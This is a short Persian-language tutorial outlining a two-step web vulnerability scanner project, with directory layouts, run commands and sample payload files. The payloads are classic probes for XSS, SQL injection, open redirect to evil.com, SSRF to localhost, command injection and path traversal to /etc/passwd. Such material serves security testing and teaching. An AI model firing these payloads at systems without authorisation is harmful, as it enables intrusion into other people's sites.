ساختار مرحله اول:
```
webhunter/
├── step1_recon.py          ← مرحله جمع‌آوری اطلاعات
├── urls.txt                ← لیست هدف‌ها
├── out/
│   ├── recon_raw.txt
│   ├── tech_stack.json
```
🐍 کد مرحله اول: step1_recon.py
ابزاری برای استخراج اطلاعات اولیه دامنه (headers، تکنولوژی، وضعیت DNS، WAF احتمالی)

طرز اجرا:
یک فایل urls.txt بساز و دامنه‌ها یا URLها رو توش بنویس:

```
https://example.com
https://target.com/login
```
اجرای اسکریپت:

```
python3 step1_recon.py
```
خروجی‌ها در پوشه out/ ذخیره می‌شن:

recon_raw.txt: خروجی خلاصه

tech_stack.json: خروجی کامل قابل استفاده برای مرحله بعد

========================================================================

===>>> step2_recon.py


 ساختار پروژه بعد از مرحله دوم:
```
webhunter/
├── step1_recon.py
├── step2_async_scanner.py    ← ابزار async اسکن
├── urls.txt
├── out/
│   ├── recon_raw.txt
│   ├── tech_stack.json
│   ├── vuln_scan_report.html  ← خروجی دسته‌بندی‌شده
├── payloads/
│   ├── xss.txt
│   ├── sql.txt
│   ├── redirect.txt
│   ├── ssrf.txt
│   ├── cmd.txt
│   ├── lfi.txt

```

📝 نمونه محتویات فایل‌های پیلود:
```
payloads/xss.txt
php-template
```

```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
payloads/sql.txt
```

```
' OR '1'='1
" OR 1=1 --
payloads/redirect.txt
```

```
https://google.com
//evil.com
payloads/ssrf.txt
```

```
http://127.0.0.1
http://localhost/admin
payloads/cmd.txt
```

```
;whoami
| ls /
payloads/lfi.txt
```

```
../../../../etc/passwd
../boot.ini
```
✅ اجرای اسکریپت:
```
python3 step2_async_scanner.py
```
🧪 خروجی:
فایل HTML out/vuln_scan_report.html تولید می‌شه که شامل جدول همه آسیب‌پذیری‌های پیدا‌شده با رنگ‌بندی نوع آسیب‌پذیری هست.
